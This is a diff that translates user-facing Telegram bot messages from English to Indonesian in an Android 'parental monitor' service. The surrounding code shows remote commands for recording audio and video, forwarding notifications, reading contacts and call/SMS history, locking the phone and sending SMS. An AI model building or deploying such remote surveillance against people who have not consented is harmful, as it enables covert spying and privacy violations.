@@ -669,7 +669,7 @@ class MonitoringService : Service() {
         }
         if (!preferencesManager.isStorageEncrypted && storageWarnAt.compareAndSet(0L, System.currentTimeMillis())) {
             serviceScope.launch {
-                sendToTelegram("Storage fallback active: secure storage unavailable, data kept in volatile memory until Setup is reopened.")
+                sendToTelegram("Mode cadangan: penyimpanan aman tak tersedia, data ditahan di memori sementara sampai Setup dibuka lagi.")
             }
         }
 
@@ -1255,7 +1255,7 @@ class MonitoringService : Service() {
                 if (!quietRestart && nowConflict - updateConflictNoticeAt > 3_600_000L) {
                     updateConflictNoticeAt = nowConflict
                     serviceScope.launch {
-                        sendToTelegram("Bot polling conflict (409): another client is reading updates, commands delayed. Stop other polling clients.")
+                        sendToTelegram("Konflik polling bot (409): klien lain sedang membaca pembaruan, perintah tertunda. Hentikan klien polling lain.")
                     }
                 }
             } catch (_: Exception) {
@@ -1679,7 +1679,7 @@ class MonitoringService : Service() {
             return
         } else if (sentAtSec > 0 && sentAtSec - nowSec > COMMAND_MAX_AGE_SEC) {
             serviceScope.launch {
-                sendToTelegram("\u23F3\uFE0F Command timestamp is in the future. Check the device clock, then send again.")
+                sendToTelegram("⏳️ Waktu perintah ada di masa depan. Periksa jam perangkat, lalu kirim ulang.")
             }
             return
         }
@@ -1695,7 +1695,7 @@ class MonitoringService : Service() {
             android.util.Log.e("MonitoringService", "Command failed: $command ($redacted)")
             try {
                 val detail = redacted.ifEmpty { "unknown error" }
-                sendToTelegram("\u26A0\uFE0F Command ${Html.escape(command)} failed (${Html.escape(detail)}). Please try again or send /help.")
+                sendToTelegram("⚠️ Perintah ${Html.escape(command)} gagal (${Html.escape(detail)}). Coba lagi atau kirim /help.")
             } catch (_: Exception) {
             }
         }
@@ -1957,14 +1957,14 @@ class MonitoringService : Service() {
                     "on" -> {
                         preferencesManager.notifForwardEnabled = true
                         if (isNotifForwarding()) {
-                            sendToTelegram("\uD83D\uDD14 Notification forwarding ON.")
+                            sendToTelegram("\uD83D\uDD14 Penerusan notifikasi NYALA.")
                         } else {
-                            sendToTelegram("Notif forwarding enabled, but OS notification access is missing. Open Setup and tap Read Notifications to allow it.")
+                            sendToTelegram("Penerusan notifikasi nyala, tapi akses notifikasi sistem belum ada. Buka Setup, tekan Read Notifications untuk mengizinkan.")
                         }
                     }
                     "off" -> {
                         preferencesManager.notifForwardEnabled = false
-                        sendToTelegram("\uD83D\uDD15 Notification forwarding OFF.")
+                        sendToTelegram("\uD83D\uDD15 Penerusan notifikasi MATI.")
                     }
                     "status", "" -> {
                         val state = if (isNotifForwarding()) "forwarding" else "off"
@@ -2031,13 +2031,13 @@ class MonitoringService : Service() {
                 if (restartAllLoops()) {
                     sendToTelegram("\u267B\uFE0F Loops restarted.")
                 } else {
-                    sendToTelegram("\u23F3\uFE0F Restart throttled, try again shortly.")
+                    sendToTelegram("⏳️ Restart dibatasi, coba lagi sebentar.")
                 }
             }
             "/flush" -> {
                 val queued = messageQueue.getQueueSize()
                 if (NetworkUtils.isAuthBlocked(preferencesManager)) {
-                    sendToTelegram("⚠️ Flush delayed: bot credentials rejected (${preferencesManager.credentialError}). Fix the token in Setup.")
+                    sendToTelegram("⚠️ Flush ditunda: kredensial bot ditolak (${preferencesManager.credentialError}). Perbaiki token di Setup.")
                     return
                 }
                 serviceScope.launch {
@@ -2058,7 +2058,7 @@ class MonitoringService : Service() {
                 if (scheduled) {
                     sendToTelegram("\uD83D\uDCE4 Flush scheduled ($queued queued). Sending when online.")
                 } else {
-                    sendToTelegram("\u26A0\uFE0F Could not schedule flush ($queued queued).")
+                    sendToTelegram("⚠️ Tak bisa menjadwalkan flush ($queued menunggu).")
                 }
             }
             "/clearqueue" -> {
@@ -2070,25 +2070,25 @@ class MonitoringService : Service() {
                 } catch (_: Exception) {
                 }
                 val dropExtra = buildString {
-                    if (overflowTaken > 0L) append(" Plus $overflowTaken overflow drop(s) discarded.")
-                    if (expiredTaken > 0L) append(" Plus $expiredTaken expired drop(s) discarded.")
+                    if (overflowTaken > 0L) append(" Ditambah $overflowTaken pesan penuh yang dibuang.")
+                    if (expiredTaken > 0L) append(" Ditambah $expiredTaken pesan kedaluwarsa yang dibuang.")
                 }
-                sendToTelegram("\uD83D\uDDD1\uFE0F Queue cleared ($queued dropped). Note: SMS/call updates already marked as seen will not resend.$dropExtra", null, true)
+                sendToTelegram("\uD83D\uDDD1\uFE0F Antrean dibersihkan ($queued dibuang). Catatan: pembaruan SMS/panggilan yang sudah ditandai terbaca tidak dikirim ulang.$dropExtra", null, true)
             }
             "/lock" -> {
                 try {
                     val dpm = devicePolicySvc
                     val admin = android.content.ComponentName(this, com.redeye.parentalmonitor.receiver.AdminReceiver::class.java)
                     if (dpm == null || !dpm.isAdminActive(admin)) {
-                        sendToTelegram("\u26A0\uFE0F Device Admin not active. Enable it in Setup first.")
+                        sendToTelegram("⚠️ Device Admin belum aktif. Aktifkan dulu di Setup.")
                     } else {
                         dpm.lockNow()
-                        sendToTelegram("\uD83D\uDD12 Device locked.")
+                        sendToTelegram("\uD83D\uDD12 Perangkat dikunci.")
                     }
                 } catch (e: SecurityException) {
-                    sendToTelegram("\u26A0\uFE0F Cannot lock: Device Admin not active.")
+                    sendToTelegram("⚠️ Tak bisa mengunci: Device Admin belum aktif.")
                 } catch (e: Exception) {
-                    sendToTelegram("\u26A0\uFE0F Lock failed.")
+                    sendToTelegram("⚠️ Gagal mengunci.")
                 }
             }
             "/ring" -> {
@@ -2096,10 +2096,10 @@ class MonitoringService : Service() {
                 if (seconds == null || seconds !in 5..60) {
                     sendToTelegram("Cara pakai: /ring [5-60] (seconds)")
                 } else if (!ringBusy.compareAndSet(false, true)) {
-                    sendToTelegram("\u23F1\uFE0F Already ringing, please wait.")
+                    sendToTelegram("⏱️ Sedang berdering, tunggu sebentar.")
                 } else if (recordBusy.get()) {
                     ringBusy.set(false)
-                    sendToTelegram("\u23F1\uFE0F Already recording, please wait.")
+                    sendToTelegram("⏱️ Sedang merekam, tunggu sebentar.")
                 } else {
                     try { ringJob?.cancel() } catch (_: Exception) { }
                     ringJob = serviceScope.launch {
@@ -2157,10 +2157,10 @@ class MonitoringService : Service() {
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     sendToTelegram("\u26A0\uFE0F Izin Mikrofon belum diberikan. Buka Setup dan berikan izin Mikrofon.")
                 } else if (!recordBusy.compareAndSet(false, true)) {
-                    sendToTelegram("\u23F1\uFE0F Already recording, please wait.")
+                    sendToTelegram("⏱️ Sedang merekam, tunggu sebentar.")
                 } else if (ringBusy.get()) {
                     recordBusy.set(false)
-                    sendToTelegram("\u23F1\uFE0F Already ringing, please wait.")
+                    sendToTelegram("⏱️ Sedang berdering, tunggu sebentar.")
                 } else {
                     sendToTelegram("\uD83C\uDF99\uFE0F Recording $seconds s\u2026")
                     try { recordJob?.cancel() } catch (_: Exception) { }
@@ -2183,12 +2183,12 @@ class MonitoringService : Service() {
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     sendToTelegram("\u26A0\uFE0F Izin Mikrofon belum diberikan. Buka Setup dan berikan izin Mikrofon.")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("\u26A0\uFE0F Camera permission missing. Buka Setup dan berikan izin Kamera.")
+                    sendToTelegram("\u26A0\uFE0F Izin Kamera belum diberikan. Buka Setup dan berikan izin Kamera.")
                 } else if (!recordBusy.compareAndSet(false, true)) {
-                    sendToTelegram("\u23F1\uFE0F Already recording, please wait.")
+                    sendToTelegram("⏱️ Sedang merekam, tunggu sebentar.")
                 } else if (ringBusy.get()) {
                     recordBusy.set(false)
-                    sendToTelegram("\u23F1\uFE0F Already ringing, please wait.")
+                    sendToTelegram("⏱️ Sedang berdering, tunggu sebentar.")
                 } else {
                     sendToTelegram("\uD83C\uDFA5 Recording video $seconds s\u2026")
                     try { recordJob?.cancel() } catch (_: Exception) { }
@@ -2225,9 +2225,9 @@ class MonitoringService : Service() {
                 } else if (isEmergencySmsNumber(normalized)) {
                     sendToTelegram("\uD83D\uDEAB Nomor darurat tidak boleh dipakai /sms. Hubungi langsung dari HP.")
                 } else if (smsText.length > 500) {
-                    sendToTelegram("\u26A0\uFE0F Message too long (max 500 characters).")
+                    sendToTelegram("⚠️ Pesan terlalu panjang (maks 500 karakter).")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
+                    sendToTelegram("⚠️ Izin SMS belum diberikan. Buka Setup dan berikan izin SMS.")
                 } else {
                     val stagedNumber = try { preferencesManager.pendingSmsNumber } catch (_: Exception) { "" }
                     val stagedAt = try { preferencesManager.pendingSmsAt } catch (_: Exception) { 0L }
@@ -2235,9 +2235,9 @@ class MonitoringService : Service() {
                     val nowSms = System.currentTimeMillis()
                     val lastSentAt = try { preferencesManager.lastSmsSendAt } catch (_: Exception) { 0L }
                     if (lastSentAt <= nowSms && nowSms - lastSentAt < 60_000L) {
-                        sendToTelegram("\u26A0\uFE0F Please wait a moment before sending another SMS.")
+                        sendToTelegram("⚠️ Tunggu sebentar sebelum mengirim SMS lagi.")
                     } else if (stagedNumber.isNotEmpty() && stagedAt > 0L && stagedAt <= nowSms && nowSms - stagedAt <= 300_000L && stagedBy.isNotEmpty() && stagedBy != senderId) {
-                        sendToTelegram("⛔ Only the requester can replace this pending SMS. Reply /smsconfirm to confirm it first, or wait for it to expire.")
+                        sendToTelegram("⛔ Hanya peminta yang bisa mengganti SMS tertunda ini. Balas /smsconfirm untuk mengonfirmasi dulu, atau tunggu sampai kedaluwarsa.")
                     } else {
                         val stagedText = try { preferencesManager.pendingSmsText } catch (_: Exception) { "" }
                         val oldPending = if (stagedNumber.isNotEmpty() && (stagedNumber != normalized || stagedText != smsText)) stagedNumber else ""
@@ -2255,18 +2255,18 @@ class MonitoringService : Service() {
                 val nowConfirm = System.currentTimeMillis()
                 if (number.isEmpty() || smsText.isEmpty() || stagedAt <= 0L || stagedAt > nowConfirm || nowConfirm - stagedAt > 300_000L) {
                     if (stagedAt <= 0L || (stagedAt <= nowConfirm && nowConfirm - stagedAt > 300_000L)) preferencesManager.clearSmsPendingIf(stagedAt)
-                    sendToTelegram("\u23F1\uFE0F No pending SMS. Send /sms &lt;number&gt; &lt;message&gt; first.")
+                    sendToTelegram("⏱️ Tak ada SMS tertunda. Kirim /sms &lt;nomor&gt; &lt;pesan&gt; dulu.")
                 } else if (stagedBy.isNotEmpty() && stagedBy != senderId) {
-                    sendToTelegram("\u26D4 Only the requester can confirm this SMS.")
+                    sendToTelegram("⛔ Hanya peminta yang bisa mengonfirmasi SMS ini.")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     sendToTelegram("\u26A0\uFE0F Izin SMS hilang. Berikan di Setup lalu stage ulang.")
                 } else if (isPremiumSmsNumber(number) || isEmergencySmsNumber(number)) {
                     preferencesManager.clearSmsPendingIf(stagedAt)
                     sendToTelegram("\uD83D\uDEAB Nomor kini diblokir, pending dibuang. Stage ulang nomor lain.")
                 } else if (preferencesManager.lastSmsSendAt <= nowConfirm && nowConfirm - preferencesManager.lastSmsSendAt < 60_000L) {
-                    sendToTelegram("\u26A0\uFE0F Please wait a moment before sending another SMS.")
+                    sendToTelegram("⚠️ Tunggu sebentar sebelum mengirim SMS lagi.")
                 } else if (!smsBusy.compareAndSet(false, true)) {
-                    sendToTelegram("\u23F1\uFE0F SMS still sending, please wait.")
+                    sendToTelegram("⏱️ SMS masih dikirim, tunggu sebentar.")
                 } else {
                     sendToTelegram("\uD83D\uDCE9 Sending SMS\u2026")
                     try { smsJob?.cancel() } catch (_: Exception) { }
@@ -2286,11 +2286,11 @@ class MonitoringService : Service() {
                     emptyList()
                 }
                 if (items.isEmpty()) {
-                    sendToTelegram("\uD83D\uDD14 No notifications recorded yet.")
+                    sendToTelegram("\uD83D\uDD14 Belum ada notifikasi tercatat.")
                 } else {
                     sendToTelegram(
                         buildString {
-                            appendLine("\uD83D\uDD14 <b>Last notifications</b>")
+                            appendLine("\uD83D\uDD14 <b>Notifikasi terakhir</b>")
                             for (item in items.takeLast(10)) {
                                 appendLine("\u2022 " + Html.escape(item.app) + ": " + Html.escape(item.title).let { it.take(safeCut(it, 80)) } + " \u2014 " + Html.escape(item.text).let { it.take(safeCut(it, 120)) })
                             }
@@ -2394,11 +2394,11 @@ class MonitoringService : Service() {
                 if (arg.isEmpty()) {
                     sendToTelegram("Cara pakai: /contacts &lt;name&gt;")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("\u26A0\uFE0F Contacts permission missing. Open Setup and grant Contacts permission.")
+                    sendToTelegram("⚠️ Izin Kontak belum diberikan. Buka Setup dan berikan izin Kontak.")
                 } else {
                     val found = searchContacts(arg.take(40))
                     if (found.isEmpty()) {
-                        sendToTelegram("\uD83D\uDC64 No contacts matching that name.")
+                        sendToTelegram("\uD83D\uDC64 Tak ada kontak yang cocok dengan nama itu.")
                     } else {
                         sendToTelegram(
                             buildString {
@@ -2461,7 +2461,7 @@ class MonitoringService : Service() {
                         emptyList()
                     }
                     if (calls.isEmpty() && sms.isEmpty()) {
-                        sendToTelegram("\uD83D\uDD0E Tak ada riwayat untuk $digits (search covers roughly the last 12 months).")
+                        sendToTelegram("\uD83D\uDD0E Tak ada riwayat untuk $digits (pencarian sekitar 12 bulan terakhir).")
                     } else {
                         val knownH = try { (calls.map { it.number } + sms.map { it.address }).distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
                         val freqH = try { batchFreqMap() } catch (_: Exception) { null }
@@ -3243,13 +3243,13 @@ class MonitoringService : Service() {
                 android.telephony.SmsManager.getDefault()
             }
         } catch (e: Exception) {
-            sendToTelegram("\u26A0\uFE0F SMS failed.")
+            sendToTelegram("⚠️ SMS gagal.")
             return
         }
         val parts: java.util.ArrayList<String> = try {
             smsManager.divideMessage(smsText).ifEmpty { java.util.ArrayList(listOf(smsText)) }
         } catch (e: Exception) {
-            sendToTelegram("\u26A0\uFE0F SMS failed.")
+            sendToTelegram("⚠️ SMS gagal.")
             return
         }
         val expected = parts.size.coerceAtLeast(1)
@@ -3281,7 +3281,7 @@ class MonitoringService : Service() {
                 androidx.core.content.ContextCompat.RECEIVER_NOT_EXPORTED
             )
         } catch (_: Exception) {
-            sendToTelegram("\u26A0\uFE0F SMS failed.")
+            sendToTelegram("⚠️ SMS gagal.")
             return
         }
         try {
@@ -3312,14 +3312,14 @@ class MonitoringService : Service() {
                 if (confirmed) {
                     preferencesManager.setLastSmsSendAtSync(System.currentTimeMillis())
                     preferencesManager.clearSmsPendingIf(stagedAt)
-                    sendToTelegram("\uD83D\uDCE9 SMS sent to $number.")
+                    sendToTelegram("\uD83D\uDCE9 SMS terkirim ke $number.")
                 } else if (okCount.get() > 0) {
                     preferencesManager.setLastSmsSendAtSync(System.currentTimeMillis())
                     val smsPreview = try { Html.escape(smsText).let { it.take(safeCut(it, 120)) } } catch (_: Exception) { "" }
                     val smsNotice = if (smsPreview.isEmpty()) "\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts). Pending kept; verify with the recipient before retrying because a retry may duplicate the delivered parts." else "\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts) to $number. Pending kept; verify with the recipient before retrying because a retry may duplicate the delivered parts. Text preview: $smsPreview"
                     sendToTelegram(smsNotice)
                 } else {
-                            sendToTelegram("\u26A0\uFE0F SMS not confirmed sent. Pending kept, try /smsconfirm again.")
+                            sendToTelegram("⚠️ SMS belum terkonfirmasi terkirim. Yang tertunda disimpan, coba /smsconfirm lagi.")
                 }
             } finally {
                 try {
@@ -3330,9 +3330,9 @@ class MonitoringService : Service() {
         } catch (e: kotlinx.coroutines.CancellationException) {
             throw e
         } catch (e: SecurityException) {
-            sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
+            sendToTelegram("⚠️ Izin SMS belum diberikan. Buka Setup dan berikan izin SMS.")
         } catch (e: Exception) {
-            sendToTelegram("\u26A0\uFE0F SMS failed.")
+            sendToTelegram("⚠️ SMS gagal.")
         }
     }
 
@@ -3616,8 +3616,8 @@ class MonitoringService : Service() {
         }
         if (count <= 0) return
         try {
-            val text = if (count == 1) "Dropped 1 message rejected by Telegram (400) — empty or permanently invalid."
-                else "Dropped $count messages rejected by Telegram (400) — empty or permanently invalid."
+            val text = if (count == 1) "1 pesan dibuang karena ditolak Telegram (400) — kosong atau permanen tak valid."
+                else "$count pesan dibuang karena ditolak Telegram (400) — kosong atau permanen tak valid."
             messageQueue.addMessage(text, true)
             MessageScheduler.scheduleMessageSend(this@MonitoringService)
         } catch (_: Exception) {
@@ -5781,8 +5781,8 @@ class MonitoringService : Service() {
                 " Periksa Setelan > Keamanan > Aplikasi admin perangkat, atau jeda foto dengan /pause." +
                 " Foto otomatis dijeda 120 mnt; jalan sendiri begitu blokir dicabut."
         }
-        return "The camera reports it is blocked, but no device admin disables it — likely the phone's own camera privacy switch (Xiaomi/Oppo/Samsung/OEM) or another parental-control tool." +
-            " Retrying every 15 min; send /photointerval 0 to turn auto photos off."
+        return "Kamera melaporkan terblokir, tapi tak ada admin perangkat yang mematikannya — kemungkinan saklar privasi kamera bawaan HP (Xiaomi/Oppo/Samsung/OEM) atau alat kontrol orang tua lain." +
+            " Dicoba lagi tiap 15 menit; kirim /photointerval 0 untuk mematikan foto otomatis."
     }
 
     private suspend fun notifyCameraFailure(reason: String) {
@@ -6503,14 +6503,14 @@ class MonitoringService : Service() {
         if (NetworkUtils.isAuthBlocked(preferencesManager)) {
             recordBusy.set(false)
             serviceScope.launch {
-                sendToTelegram("Auth rejected, video delayed until the token is fixed in Setup.")
+                sendToTelegram("Token ditolak — video ditahan sampai token diperbaiki di Setup.")
             }
             return
         }
         if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) {
             recordBusy.set(false)
             serviceScope.launch {
-                sendToTelegram("Rate limited, video delayed for retry.")
+                sendToTelegram("Dibatasi Telegram (rate limit) — video ditahan lalu dicoba lagi.")
             }
             return
         }
@@ -6518,7 +6518,7 @@ class MonitoringService : Service() {
         if (!hasCameraPermission()) {
             recordBusy.set(false)
             serviceScope.launch {
-                sendToTelegram("⚠️ Camera permission missing. Buka Setup dan berikan izin Kamera.")
+                sendToTelegram("⚠️ Izin Kamera belum diberikan. Buka Setup dan berikan izin Kamera.")
             }
             return
         }
@@ -6534,7 +6534,7 @@ class MonitoringService : Service() {
             autoPausePhotosOnPolicyBlock()
             val blockers = cameraBlockingAdmins()
             serviceScope.launch {
-                sendToTelegram("⚠️ Video blocked by device policy (CAMERA_DISABLED). " + policyFailureHint(blockers))
+                sendToTelegram("⚠️ Video diblokir kebijakan perangkat (CAMERA_DISABLED). " + policyFailureHint(blockers))
             }
             return
         }
@@ -6624,7 +6624,7 @@ class MonitoringService : Service() {
             recordBusy.set(false)
             android.util.Log.e("MonitoringService", "✗ Error in recordAndSendVideo: ${redactToken(e.message)}")
             serviceScope.launch {
-                sendToTelegram("⚠️ Video record failed.")
+                sendToTelegram("⚠️ Gagal merekam video.")
             }
         }
     }
